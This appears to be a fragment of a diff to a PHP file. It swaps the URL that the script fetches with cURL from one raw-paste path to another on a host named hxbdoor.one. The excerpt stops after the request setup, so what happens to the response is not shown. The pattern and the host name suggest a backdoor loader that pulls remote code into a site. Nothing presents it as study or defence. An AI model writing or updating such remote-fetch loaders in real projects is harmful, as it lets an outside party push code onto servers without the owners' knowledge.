@@ -1,5 +1,5 @@
 <?php
-$url = "https://hxbdoor.one/raw/VbHMwWOB";
+$url = "https://hxbdoor.one/raw/8M7FP6vI";
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HEADER, true);
